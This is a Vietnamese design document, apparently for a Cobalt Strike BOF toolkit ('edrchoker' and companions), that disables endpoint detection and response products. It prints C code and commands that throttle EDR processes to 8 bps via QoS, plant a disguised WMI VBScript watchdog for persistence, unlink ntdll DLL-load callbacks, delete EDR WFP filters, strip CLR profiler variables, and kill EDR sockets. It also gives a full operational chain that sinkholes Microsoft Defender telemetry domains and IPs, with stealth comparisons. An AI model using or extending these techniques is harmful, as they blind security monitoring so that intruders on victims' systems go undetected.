WMI schema khai báo `ThrottleRateAction` là `uint64` nhưng WMI serialization trong `ROOT\StandardCimv2` encode uint64 property dưới dạng string. Đây là quirk của WMI provider — cố set `VT_UI8 = 8` thì `PutInstance` trả `WBEM_E_TYPE_MISMATCH (0x80041008)`.

### 6.6 CreatePolicy — Dual Store Write (v2, đã bỏ verify)

```c
static BOOL CreatePolicy(IWbemServices* svc, const wchar_t* proc) {
    wchar_t name[9]; RandName(name, 8);          // generate random 8-char name

    BOOL okA = CreatePolicyInStore(svc, proc, name, L"ActiveStore");
    BOOL okP = CreatePolicyInStore(svc, proc, name, L"PersistentStore");

    if (!okA && !okP) {
        BeaconPrintf(CALLBACK_ERROR, "  [-] %S: PutInstance failed\n", proc);
        return FALSE;
    }

    const wchar_t* sA; if (okA) { sA = L"ok"; } else { sA = L"fail"; }
    const wchar_t* sP; if (okP) { sP = L"ok"; } else { sP = L"fail"; }

    BeaconPrintf(CALLBACK_OUTPUT,
        "  [+] %S -> '%S' active=%S persist=%S\n",
        proc, name, sA, sP);
    return okA || okP;
}
```

**Tại sao ghi cả hai store:**
- `ActiveStore` only: policy active ngay nhưng mất sau reboot
- `PersistentStore` only: policy chưa active cho đến khi reboot
- Cả hai: active ngay + persist sau reboot (như `New-NetQosPolicy -PolicyStore All`)

**Tại sao không dùng ternary operator:** Theo yêu cầu project — code đơn giản, dễ đọc, không có toán tử ba ngôi.

### 6.7 WQL Removal (BuildRemoveWQL + ExecDeleteQuery)

```c
static void BuildRemoveWQL(wchar_t* out, int max, wchar_t* list) {
    int p = WAppend(out, 0, max,
        L"SELECT * FROM MSFT_NetQosPolicySettingData WHERE ");
    wchar_t* c = list; wchar_t* tok; BOOL first = TRUE;
    while ((tok = WNextTok(&c)) != NULL) {
        if (!first) p = WAppend(out, p, max, L" OR ");
        p = WAppend(out, p, max, L"AppPathNameMatchCondition = '");
        p = WAppend(out, p, max, tok);
        if (p < max - 1) out[p++] = L'\'';
        first = FALSE;
    }
    out[p] = L'\0';
}
```

**Ví dụ output với input `"MsSense.exe;elastic-endpoint.exe"`:**
```sql
SELECT * FROM MSFT_NetQosPolicySettingData WHERE
  AppPathNameMatchCondition = 'MsSense.exe' OR
  AppPathNameMatchCondition = 'elastic-endpoint.exe'
```

`ExecDeleteQuery` sau đó:
1. `ExecQuery()` với WQL trên → iterator
2. Lấy `__PATH` (WMI object path) và `AppPathNameMatchCondition` từ mỗi object
3. Gọi `DeleteInstance(__PATH)` để xóa
4. Print process name trả về status

**Tại sao không thể dùng `ThrottleRateAction <= 100` trong WHERE:**
WMI lưu `ThrottleRateAction` là VT_BSTR (string). WQL không thể so sánh string như số. Query `WHERE ThrottleRateAction = '8'` sẽ không khớp policy do vendor khác tạo với giá trị khác.

### 6.8 CoInitializeEx và COM Proxy Blanket

```c
HRESULT hr = OLE32$CoInitializeEx(NULL, COINIT_MULTITHREADED);
BOOL coOwned = (hr == S_OK);  // S_FALSE = COM đã initialized, không cần uninit
```

```c
OLE32$CoSetProxyBlanket((IUnknown*)svc,
    RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL,
    RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE,
    NULL, EOAC_NONE);
```

**Tại sao cần ProxyBlanket:**
`CoCreateInstance(IWbemLocator)` tạo in-process COM object. Khi object gọi WMI service (cross-process RPC), COM cần security context. Mặc định COM dùng `AUTHN_LEVEL_NONE` cho local connections, nhưng WMI yêu cầu ít nhất `RPC_C_AUTHN_LEVEL_CALL`. Không set ProxyBlanket → WMI gọi thất bại với `WBEM_E_ACCESS_DENIED`.

**`coOwned` flag:**
Nếu `CoInitializeEx` trả `S_OK`: thread này vừa init COM, phải gọi `CoUninitialize` khi xong.
Nếu trả `S_FALSE`: COM đã được init (có thể bởi Beacon runtime), không nên uninit.

### 6.9 Argument Parsing trong go()

```c
wchar_t cmd[32];
int ci = 0;
if (cmdA) {
    for (; ci < 31 && cmdA[ci]; ci++)
        cmd[ci] = (wchar_t)(unsigned char)cmdA[ci];  // ASCII to wchar_t
}
cmd[ci] = L'\0';

LONG mode = 0;
if (cmd[0] == L'r' && cmd[6] == L'\0') mode = 1;  // "remove" (6 chars)
if (cmd[0] == L'r' && cmd[6] == L'_')  mode = 2;  // "remove_all"
if (cmd[0] == L'l')                     mode = 3;  // "list"
```

**Tại sao không dùng `wcscmp`:** `wcscmp` là CRT function. BOF không có CRT. Dùng index check thay thế.

**Tại sao `unsigned char` cast:**
`cmdA` là `char*` từ beacon parser. Nếu string chứa byte > 127 (ASCII extended), cast `(wchar_t)cmdA[ci]` sẽ sign-extend nếu `char` là signed, cho giá trị âm như 0xFFxx. Cast qua `unsigned char` trước cho giá trị đúng 0x00xx.

---

## 7. edrchoker_v3 — Registry-Based QoS (Không WMI)

### 7.1 Group Policy QoS Registry Path

Windows có hai mechanism QoS độc lập:

| Mechanism | Lưu ở đâu | Management | Effect |
|-----------|-----------|-----------|--------|
| WMI QoS (`MSFT_NetQosPolicySettingData`) | WMI Repository | NetQosSvc | Immediate (ActiveStore) |
| Group Policy QoS | `HKLM\SOFTWARE\Policies\Microsoft\Windows\QoS\` | Group Policy CSE | Sau reboot hoặc `gpupdate` |

edrchoker_v3 dùng Group Policy QoS path.

**Registry structure:**
```
HKLM\SOFTWARE\Policies\Microsoft\Windows\QoS\
  └── <PolicyName>  ← random 8-char name
        Version          = "1.0"          (REG_SZ)
        Protocol         = "TCP"          (REG_SZ)
        Application Name = "MsSense.exe"  (REG_SZ)
        Local Port       = "*"            (REG_SZ)
        Local IP         = "*"            (REG_SZ)
        Remote Port      = "*"            (REG_SZ)
        Remote IP        = "*"            (REG_SZ)
        DSCP Value       = "*"            (REG_SZ)
        Throttle Rate    = "8"            (REG_SZ)
```

### 7.2 So Sánh v2 và v3

| Tiêu chí | v2 (WMI) | v3 (Registry) |
|---------|----------|--------------|
| Hiệu lực ngay | Có (ActiveStore) | Không (cần reboot/gpupdate) |
| Persist sau reboot | Có (PersistentStore) | Có (registry) |
| Imports | OLE32, OLEAUT32, KERNEL32 | ADVAPI32, KERNEL32 |
| WMI provider events | Có (visible trong WMI log) | Không |
| COM initialization | Có | Không |
| DCOM traffic | Có (local RPC) | Không |
| Kích thước BOF | Lớn hơn | Nhỏ hơn |
| Detection risk | Trung bình | Thấp |

### 7.3 Kích Hoạt Sau Khi ghi registry

Sau khi `edrchoker_v3 add "proc.exe"`:
```
# Cách 1: Group Policy refresh (ít noise nhất)
shell gpupdate /force

# Cách 2: Restart NetQosSvc service
shell net stop NetQosSvc & net start NetQosSvc

# Cách 3: Reboot (chắc chắn nhất, nếu operational context cho phép)
```

### 7.4 ADVAPI32 Registry Calls

```c
// Tạo/mở key (tạo intermediate keys tự động)
ADVAPI32$RegCreateKeyExW(
    HKEY_LOCAL_MACHINE,
    L"SOFTWARE\\Policies\\Microsoft\\Windows\\QoS\\aBcDeFgH",
    0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, &disp);

// Set REG_SZ value
// Kích thước = (len + 1) * sizeof(wchar_t) — bao gồm null terminator
ADVAPI32$RegSetValueExW(hKey, L"Application Name", 0, REG_SZ,
    (const BYTE*)L"MsSense.exe", 12 * sizeof(wchar_t));
```

**Lưu ý `RegCreateKeyExW` tạo intermediate keys:** Nếu `SOFTWARE\Policies\Microsoft\Windows\QoS` chưa tồn tại, `RegCreateKeyExW` với full path sẽ tạo tất cả các key còn thiếu — không cần tạo từng cấp thủ công.

---

## 8. Các Kỹ Thuật Bổ Sung — Userland BOFs

Ngoài throttle mạng, còn 4 BOF bổ sung nhắm vào các layer khác của EDR.

### 8.1 ldr_notify_purge — Xóa DLL Load Notification Callbacks

**EDR làm gì:** Khi EDR DLL được inject vào process (qua kernel driver), `DllMain` gọi `LdrRegisterDllNotification()` để đăng ký callback. Sau đó mỗi khi một DLL mới được load vào process, callback này fire và EDR:
- Cài hook trên exports của DLL mới
- Log DLL load event lên telemetry
- Scan DLL content

**Kỹ thuật:** ntdll maintain `LdrpDllNotificationList` — doubly-linked list circular. Mỗi entry có:
```
struct LDR_DLL_NOTIFICATION_ENTRY {
    LIST_ENTRY  Links;     // +0x00: Flink, Blink
    PVOID       Callback;  // +0x10: EDR function pointer
    PVOID       Context;   // +0x18: EDR private context
};
```

BOF:
1. Đăng ký dummy callback để có pointer vào list
2. Walk list, với mỗi entry: `VirtualQuery(Callback)` → `GetModuleFileNameW(AllocationBase)` để xác định DLL chủ
3. Nếu không phải ntdll/kernel32/kernelbase → unlink: `entry->Links.Blink->Flink = Flink; entry->Links.Flink->Blink = Blink`
4. Set entry self-referential để `LdrUnregisterDllNotification` sau đó của EDR là no-op, không crash

**Kết quả:** Mọi DLL load sau khi BOF chạy → EDR callback không fire → DLL không bị hook, không có telemetry.

**Phạm vi:** Hook trên DLL đã load sẵn **không bị xóa** — dùng standard unhooking cho phần đó.

**Version support:** `LdrRegisterDllNotification` exported từ ntdll.dll since Windows Vista. Offset của struct (Links@0, Callback@0x10, Context@0x18) stable trên tất cả version Vista, 7, 8, 10, 11.

### 8.2 wfp_filter_purge — Xóa WFP Filters Của EDR

**EDR làm gì:** Nhiều EDR (MDE, Symantec, CrowdStrike DPI module) đăng ký:
- `FwpmCalloutAdd0`: callout — function trong kernel driver, nhận packet để inspect
- `FwpmFilterAdd0`: filter rule — điều kiện trigger callout

Filter là **luật kích hoạt callout**. Không có filter → callout không bao giờ được gọi, dù code callout vẫn còn trong kernel memory.

**Tầng WFP:**
```
KERNEL LAYER (fwpkclnt.sys)    ← chỉ driver mới access được
  FwpsCalloutRegister()        ← đăng ký callout function

MANAGEMENT LAYER (fwpuclnt.dll) ← USER-MODE, documented API
  FwpmFilterAdd0()             ← thêm rule kích hoạt callout
  FwpmFilterDeleteById0()      ← XÓA rule ← đây là chỗ BOF tấn công
```

**Attack flow:**
1. `FwpmEngineOpen0()` → mở BFE (Base Filtering Engine) via local RPC
2. `FwpmFilterEnum0()` → liệt kê toàn bộ filter
3. Filter nào có name chứa keyword ("defender", "sense", "crowdstrike") → collect ID
4. `FwpmFilterDeleteById0(filterId)` → xóa khỏi BFE → kernel remove từ active match table

**Kết quả:** EDR callout không còn được gọi cho connection mới. EDR không thể: log connection metadata, inspect TLS SNI, block traffic via WFP. Windows Firewall rules **không bị ảnh hưởng** (different provider namespace).

**Không cần driver:** `fwpuclnt.dll` là documented user-mode API — đây là cách Windows Firewall MMC và `netsh advfirewall` hoạt động.

### 8.3 clr_profiler_strip — Xóa .NET Profiler Injection

**EDR làm gì:** CLR (Common Language Runtime) đọc environment variables khi khởi động lần đầu trong process:
```
COR_ENABLE_PROFILING=1
COR_PROFILER={CLSID của EDR profiler DLL}
COR_PROFILER_PATH=C:\EDR\profiler.dll
```
Nếu set, CLR load profiler DLL và gọi `ICorProfilerCallback::Initialize()`. EDR sau đó nhận callback cho **mọi method call** trong managed code — dùng để monitor SharpHound, Rubeus, Seatbelt khi chạy qua `execute-assembly`.

**Attack:** `SetEnvironmentVariableW(name, NULL)` xóa biến khỏi environment block của process hiện tại. CLR khởi động sau đó không thấy profiler config → không load EDR DLL.

**BOF xóa 17 biến** bao gồm:
- `COR_ENABLE_PROFILING`, `COR_PROFILER`, `COR_PROFILER_PATH` (.NET Framework 1-4)
- `CORECLR_ENABLE_PROFILING`, `CORECLR_PROFILER` (.NET Core / .NET 5+)
- `DOTNET_STARTUP_HOOKS` (.NET 5+ startup hook injection)

**TIMING QUAN TRỌNG:** BOF phải chạy **TRƯỚC** `execute-assembly`. CLR đọc profiler vars lúc init — sau khi CLR đã chạy (previous execute-assembly), profiler đã attached và không thể remove.

### 8.4 sock_kill — RST Active EDR Connections

**Vấn đề NRPT/null_route không giải quyết:** NRPT sinkhole và null route ngăn EDR *tạo kết nối mới*. Nhưng nếu EDR đã có HTTPS session mở đến cloud trước khi ta install các rule đó → session đó tiếp tục chạy.

**Cơ chế:**
- Windows TCP socket là file object của `afd.sys` (Ancillary Function Driver)
- Handle type trong NT object namespace: `\Device\Afd`
- Khi handle cuối cùng đến AFD socket bị close: `afd.sys` gửi TCP RST ngay lập tức

**`NtDuplicateObject(DUPLICATE_CLOSE_SOURCE)`:**
```c
NtDuplicateObject(
    hTargetProc,           // nguồn: EDR process
    (HANDLE)handleValue,   // handle trong EDR process
    GetCurrentProcess(),   // đích: process của ta (để nhận local copy)
    &hLocalCopy,
    0, 0,
    DUPLICATE_CLOSE_SOURCE // đóng handle TRONG EDR process
);
// Đóng hLocalCopy ngay sau đó
// Kết quả: socket handle trong EDR đã closed → TCP RST gửi
```

**Detection vs alternatives:**
| Kỹ thuật | Artifact tồn tại |
|---------|-----------------|
| WFP filter block | Filter entry visible trong FwpmFilterEnum |
| Firewall rule | Registry entry, netsh show |
| NRPT sinkhole | Registry key |
| null_route | Routing table entry |
| **sock_kill** | **Không** — handle đơn giản là gone, EDR thấy "WSAECONNRESET" như network glitch bình thường |

**Giới hạn PPL:** `MsSense.exe` và `csagent.exe` là Protected Process Light (PPL). `OpenProcess(PROCESS_DUP_HANDLE, MsSense_PID)` sẽ bị denied từ non-PPL process. Dùng NRPT + null_route cho PPL processes (connection cuối cùng cũng drop tự nhiên).

---

## 9. Tương Thích Windows — Build Number Reference

### 9.1 edrchoker v1/v2 (WMI MSFT_NetQosPolicySettingData)

| Windows Version | Build | Hỗ trợ | Ghi chú |
|----------------|-------|---------|---------|
| Windows 7 / Server 2008 R2 | 7601 | **Không** | `ROOT\StandardCimv2` không có `MSFT_NetQosPolicySettingData` |
| Windows 8 | 9200 | Có thể | Class hiện diện nhưng chưa kiểm tra đầy đủ |
| Windows 8.1 / Server 2012 R2 | 9600 | **Có** | Bản đầu tiên documented hỗ trợ class này |
| Windows 10 1507 | 10240 | **Có** | |
| Windows 10 1511 – 22H2 | 10586–19045 | **Có** | Đầy đủ |
| Windows 11 21H2 – 23H2 | 22000–22631 | **Có** | Đầy đủ |
| Windows 11 24H2 | 26100 | **Có** | Đầy đủ |
| Server 2016 / 2019 / 2022 | 14393–20348 | **Có** | Đầy đủ |
| Server 2025 | 26040+ | **Có** | Đầy đủ |

**Lưu ý:** Mọi Windows 10+ build đều hỗ trợ.

### 9.2 edrchoker v3 (Registry Group Policy QoS)

| Windows Version | Build | Hỗ trợ |
|----------------|-------|---------|
| Windows Vista / Server 2008 | 6002+ | **Có** (Group Policy QoS available) |
| Windows 7 trở lên | Tất cả | **Có** |
| Windows 10/11 | Tất cả | **Có** |

v3 coverage rộng hơn v2 — nhưng cần activation.

### 9.3 ldr_notify_purge

| Windows Version | Build | Hỗ trợ |
|----------------|-------|---------|
| Windows Vista trở lên | Tất cả | **Có** |
| Windows 7 trở lên | Tất cả | **Có** |

`LdrRegisterDllNotification` được export từ ntdll.dll kể từ Windows Vista. Struct layout (Links@0, Callback@0x10, Context@0x18 trên x64) stable trên tất cả version.

### 9.4 wfp_filter_purge

| Windows Version | Build | Hỗ trợ |
|----------------|-------|---------|
| Windows Vista / Server 2008 | 6002+ | **Có** (WFP introduced) |
| Windows 7 trở lên | Tất cả | **Có** |

WFP (Windows Filtering Platform) và `fwpuclnt.dll` được giới thiệu từ Windows Vista. Tất cả version sau đó đều hỗ trợ.

### 9.5 clr_profiler_strip

| .NET Version | Biến | Hỗ trợ |
|-------------|------|---------|
| .NET Framework 1.0+ | `COR_ENABLE_PROFILING`, `COR_PROFILER` | Tất cả Windows có .NET |
| .NET Core 2.0+ | `CORECLR_ENABLE_PROFILING`, `CORECLR_PROFILER` | Windows 10+ phổ biến |
| .NET 5+ | `DOTNET_STARTUP_HOOKS` | Windows 10 1903+ |

BOF strip tất cả biến của tất cả version — safe trên mọi Windows.

### 9.6 sock_kill

| Windows Version | Build | Hỗ trợ |
|----------------|-------|---------|
| Windows XP trở lên | Tất cả | **Có** |
| Windows 10/11 (non-PPL) | Tất cả | **Có** |
| EDR chạy dưới PPL | Tất cả | **Không** — dùng NRPT+null_route |

`NtDuplicateObject` và `NtQuerySystemInformation(SystemExtendedHandleInformation=64)` available từ Windows XP. `SystemExtendedHandleInformation` class 64 ổn định từ Windows XP SP2.

---

## 10. Chain Đầy Đủ — Kết Hợp Tất Cả Kỹ Thuật

Với tất cả BOF đã có, chain đầy đủ cho MDE:

```
# --- Bước 0: Strip CLR profiler TRƯỚC (trước bất kỳ execute-assembly nào) ---
clr_profiler_strip strip

# --- Bước 1: Xóa LDR notifications (tương lai DLL load không bị hook) ---
ldr_notify_purge purge

# --- Bước 2: Dừng ETW (làm mù behavioral detection) ---
etw_tamper mde

# --- Bước 3: Xóa WFP filters của MDE (network inspection) ---
wfp_filter_purge purge sense

# --- Bước 4: Chặn DNS ---
nrpt_sinkhole *.endpoint.microsoft.com;*.wdcp.microsoft.com;*.ods.opinsights.azure.com;*.security.microsoft.com;*.events.data.microsoft.com

# --- Bước 5: Chặn IP hardcoded ---
null_route 20.190.128.1;20.190.129.1;52.183.20.1;13.89.176.1

# --- Bước 6: Kill connections đang mở ---
sock_kill kill MsSense.exe;MsSenseS.exe

# --- Bước 7: QoS failsafe (persist qua reboot) ---
edrchoker_v2 add "MsSense.exe;MsSenseS.exe;SenseNdr.exe"
```

**Layer coverage:**

```
  LAYER                    KỸ THUẬT               BLOCK GÌ
  ──────────────────────────────────────────────────────────────────────
  .NET runtime monitoring  clr_profiler_strip     EDR không attach CLR profiler
  DLL load visibility      ldr_notify_purge       EDR không hook DLL mới load
  Kernel telemetry         etw_tamper             Không có behavioral events
  Network inspection       wfp_filter_purge       EDR callout không invoke
  DNS resolution           nrpt_sinkhole          Domain lookup → SERVFAIL
  TCP hardcoded IP         null_route             connect() → WSAECONNREFUSED
  Active connections       sock_kill              RST connections đang mở
  Residual traffic         edrchoker_v2           8 bps cap — failsafe cuối cùng
  ──────────────────────────────────────────────────────────────────────
```

Sau khi apply full chain, EDR process vẫn running nhưng:
- Không nhận kernel behavioral events
- Không hook DLL load mới
- Không inspect network traffic
- Không resolve domain để kết nối cloud
- Không có TCP connection nào đến cloud tồn tại
- Mọi connection attempt bị throttle về 8 bps
- Tất cả layer trên persist sau reboot (QoS PersistentStore, registry routes, WMI subscription nếu cần)

---

## 11. So Sánh Ba Phiên Bản — v1, v2, v3

### 11.1 Bảng So Sánh Toàn Diện

| Tiêu chí | v1 (WMI + Watchdog) | v2 (WMI, không subscription) | v3 (Registry, không WMI) |
|---------|--------------------|-----------------------------|--------------------------|
| File | `edrchoker.bof.c` | `edrchoker_v2.bof.c` | `edrchoker_v3.bof.c` |
| CNA | `edrchoker.cna` | `edrchoker_v2.cna` | `edrchoker_v3.cna` |
| WMI COM | Có | Có | **Không** |
| WMI subscription watchdog | **Có** (VBScript tự reinstall) | Không | Không |
| Hiệu lực ngay | Có (ActiveStore) | Có (ActiveStore) | **Không** (cần reboot/gpupdate) |
| Persist sau reboot | Có (PersistentStore + watchdog) | Có (PersistentStore) | Có (registry) |
| DLL imports | OLE32, OLEAUT32, KERNEL32 | OLE32, OLEAUT32, KERNEL32 | **ADVAPI32, KERNEL32** |
| DCOM local RPC | Có | Có | Không |
| WMI provider events | Có | Có | **Không** |
| Verify step sau PutInstance | Có | Không (đã bỏ) | N/A |
| Filter list/remove_all | `ThrottleRateAction = '8'` | `ThrottleRateAction = '8'` | `Throttle Rate = "8"` |
| Detection risk | **CAO** (T1546.003) | Trung bình | **Thấp** |
| Windows support | Win 8.1+ (build 9600+) | Win 8.1+ (build 9600+) | Win Vista+ (build 6002+) |
| Kích thước BOF | Lớn nhất | Lớn | Nhỏ nhất |
| Khi nào dùng | Lab/nghiên cứu (watchdog cần thiết) | Production (immediate, persist) | Stealth cao nhất, chấp nhận delay |

### 11.2 Khi Nào Dùng Phiên Bản Nào

**Chọn v2 trong hầu hết trường hợp production:**
- Hiệu lực ngay (ActiveStore), persist sau reboot (PersistentStore)
- Không có WMI subscription → tránh T1546.003 alert
- Cùng cơ chế pacer.sys với v1, không cần watchdog vì `AppPathNameMatchCondition` match theo tên process — EDR restart là bị throttle lại ngay

**Chọn v3 khi cần stealth tối đa:**
- Không có COM/WMI → không trigger WMI provider host events, không có DCOM RPC
- Chỉ cần ADVAPI32 registry calls — surface attack nhỏ nhất
- Trade-off: không immediate, phải chạy thêm `gpupdate /force` hoặc reboot

**v1 chỉ dùng cho nghiên cứu:**
- Watchdog subscription tạo detection IOC tĩnh trong WMI repository
- Microsoft Defender và nhiều EDR khác có rule built-in cho T1546.003

---

## 12. Giải Thích Code v1 — Các Hàm Đặc Thù

v1 (`edrchoker.bof.c`) có toàn bộ chức năng của v2 CỘNG với WMI subscription watchdog. Phần này giải thích các hàm **chỉ có ở v1**, không có ở v2/v3.

### 12.1 WContains — Substring Search Không Dùng CRT

```c
static BOOL WContains(const wchar_t* str, const wchar_t* needle) {
    int sLen = 0; while (str[sLen]) sLen++;
    int nLen = 0; while (needle[nLen]) nLen++;
    for (int i = 0; i <= sLen - nLen; i++) {
        int match = 1;
        for (int j = 0; j < nLen; j++) {
            if (str[i + j] != needle[j]) { match = 0; break; }
        }
        if (match) return TRUE;
    }
    return FALSE;
}
```

**Dùng để làm gì:** Fingerprint WMI subscription của ta khi enumerate trong `RemoveSubscription` và `ListPolicies`. Check field `Query` của `__EventFilter` có chứa `"MSFT_NetQosPolicySettingData"` không — nếu có thì đó là subscription của edrchoker, không phải của system.

**Tại sao không dùng `wcsstr`:** `wcsstr` là CRT function. BOF không có CRT linkage.

### 12.2 g_ScriptText — VBScript Watchdog

```c
static const wchar_t g_ScriptText[] =
    L"Set svc = GetObject(\"winmgmts:\\\\.\\root\\standardcimv2\")\r\n"
    L"Set cls = svc.Get(\"MSFT_NetQosPolicySettingData\")\r\n"
    L"Set inst = cls.SpawnInstance_()\r\n"
    L"inst.Name = \"" /* + embedded random name */ L"\"\r\n"
    L"inst.ThrottleRateAction = \"8\"\r\n"
    L"...\r\n"
    L"svc.PutInstance inst, 1, Nothing, Nothing\r\n";
```

Script VBScript được inject vào `ActiveScriptEventConsumer`. Khi WMI phát hiện policy của ta bị xóa (qua `__InstanceDeletionEvent`), `WmiPrvSE.exe` invoke `scrobj.dll` để chạy script này. Script:
1. Kết nối lại `ROOT\StandardCimv2` qua WMI moniker `"winmgmts:"`
2. Spawn instance mới của `MSFT_NetQosPolicySettingData`
3. Set các property tương tự (name cũ được embed vào script lúc `InstallSubscription`)
4. Gọi `PutInstance` để ghi lại

**Kết quả:** Policy tự phục hồi trong vòng ~10 giây sau khi bị xóa.

**Detection:** `ActiveScriptEventConsumer` với script VBScript trong `ROOT\subscription` là IOC phổ biến nhất của T1546.003. Microsoft Defender có built-in alert cho pattern này.

### 12.3 BuildWatchWQL — WQL cho Event Filter

```c
static void BuildWatchWQL(wchar_t* out, int max) {
    WAppend(out, 0, max,
        L"SELECT * FROM __InstanceDeletionEvent WITHIN 10 "
        L"WHERE TargetInstance ISA 'MSFT_NetQosPolicySettingData' "
        L"AND TargetInstance.ThrottleRateAction = '8'");
}
```

**`__InstanceDeletionEvent WITHIN 10`:** WMI polling event. WMI kiểm tra mỗi 10 giây nếu có instance nào của class được chỉ định bị xóa. Không phải push notification — WMI tự poll bảng instance.

**`ThrottleRateAction = '8'`:** Chỉ fire khi policy có rate = 8 bps bị xóa. Không trigger với system QoS deletion events.

### 12.4 InstallSubscription — Cài WMI Permanent Subscription

Ba object được tạo trong `ROOT\subscription` namespace:

```
1. __EventFilter "SchedMaint<rand>":
   - EventNamespace = "ROOT\\StandardCimv2"
   - QueryLanguage  = "WQL"
   - Query          = BuildWatchWQL() output

2. ActiveScriptEventConsumer "SchedMaint<rand>":
   - ScriptingEngine = "VBScript"
   - ScriptText      = g_ScriptText (watchdog script)

3. __FilterToConsumerBinding:
   - Filter   = "\\\\.\\ROOT\\subscription:__EventFilter.Name=..."
   - Consumer = "\\\\.\\ROOT\\subscription:ActiveScriptEventConsumer.Name=..."
```

**Tại sao cần ba object:** Đây là WMI permanent subscription architecture:
- `__EventFilter`: định nghĩa **điều kiện** (khi nào fire)
- Consumer (`ActiveScriptEventConsumer`): định nghĩa **hành động** (làm gì khi fire)
- `__FilterToConsumerBinding`: **liên kết** filter với consumer

Thiếu binding → filter và consumer tồn tại riêng lẻ nhưng không kết nối — watchdog không hoạt động. Thiếu filter → consumer không biết khi nào chạy. Ba object phải cùng hiện diện.

**Tên dùng prefix `SchedMaint`** để giả dạng Windows Scheduled Maintenance subscription — tên ngẫu nhiên bổ sung làm khó tìm IOC tĩnh.

### 12.5 RemoveSubscription — Gỡ Watchdog

```c
static void RemoveSubscription(IWbemServices* pSub) {
    // 1. ExecQuery ROOT\subscription cho __EventFilter
    //    WHERE "MSFT_NetQosPolicySettingData" có trong field Query
    // 2. DeleteInstance(__PATH) cho từng result
    // 3. Lặp lại cho ActiveScriptEventConsumer
    // 4. Lặp lại cho __FilterToConsumerBinding
}
```

Dùng `WContains(queryField, L"MSFT_NetQosPolicySettingData")` để chỉ xóa subscription của ta. Không xóa system subscription (ví dụ: Windows Defender subscription có tên khác).

`remove_all` trong v1 gọi **cả hai**: `ExecDeleteQuery()` (xóa QoS policies) **VÀ** `RemoveSubscription()` (gỡ watchdog). v2/v3 chỉ xóa QoS policies.

### 12.6 ListPolicies(svc, sub) — Hiển Thị Kèm Trạng Thái Watchdog

```c
static void ListPolicies(IWbemServices* svc, IWbemServices* sub) {
    // svc = kết nối ROOT\StandardCimv2
    // sub = kết nối ROOT\subscription (để check watchdog)

    // 1. Query: SELECT * FROM MSFT_NetQosPolicySettingData WHERE ThrottleRateAction = '8'
    //    → print từng policy (AppPathNameMatchCondition, Name, InstanceID)

    // 2. Query ROOT\subscription: SELECT * FROM __EventFilter
    //    → dùng WContains để tìm filter của ta
    //    → print "watchdog: active" hoặc "watchdog: not installed"
}
```

v2 chỉ có `ListPolicies(svc)` — một param, không check watchdog (không có watchdog).

---

## 13. Fix Log — Các Lỗi Đã Sửa

| File | Vấn đề gốc | Fix đã áp dụng |
|------|-----------|----------------|
| `edrchoker.bof.c` (v1) | `ListPolicies` dùng `SELECT * FROM MSFT_NetQosPolicySettingData` không filter → hiển thị toàn bộ QoS policy của hệ thống | Thêm `WHERE ThrottleRateAction = '8'` |
| `edrchoker.bof.c` (v1) | `remove_all` dùng query không filter → có thể xóa system QoS policy | Thêm `WHERE ThrottleRateAction = '8'` |
| `edrchoker.bof.c` (v1) | `PutI4()` defined nhưng không được gọi ở bất kỳ đâu (dead code) | Xóa hàm |
| `edrchoker_v2.bof.c` (v2) | `CreatePolicy` có verify step: gọi `GetObject(__PATH)` sau `PutInstance` để xác nhận — thêm một COM round-trip không cần thiết | Bỏ verify block, đơn giản hóa output thành `active=%S persist=%S` |
| `edrchoker_v2.bof.c` (v2) | `ListPolicies` và `remove_all` không filter (giống v1) | Thêm `WHERE ThrottleRateAction = '8'` |
| `edrchoker_v3.bof.c` (v3) | `ListQosPolicies` liệt kê tất cả subkey trong `HKLM\...\QoS` — bao gồm cả policy của Group Policy/system | Đọc thêm `Throttle Rate` value per subkey, skip nếu ≠ `"8"` |
| `edrchoker_v3.bof.c` (v3) | `DeleteQosPolicies(NULL)` (remove_all) xóa tất cả QoS registry key không phân biệt nguồn gốc | Thêm check: khi `matchList == NULL`, chỉ xóa nếu `Throttle Rate = "8"` |

**Fingerprint của policy do edrchoker tạo:**
- v1/v2 (WMI): `ThrottleRateAction = '8'` trong `MSFT_NetQosPolicySettingData`
- v3 (Registry): value `Throttle Rate` = `"8"` trong registry subkey

Không có policy QoS hợp lệ nào trong thực tế dùng 8 bps — đây là giá trị đủ nhỏ để là zero throughput nhưng vẫn là giá trị hợp lệ của field (không bị WMI/GP reject).
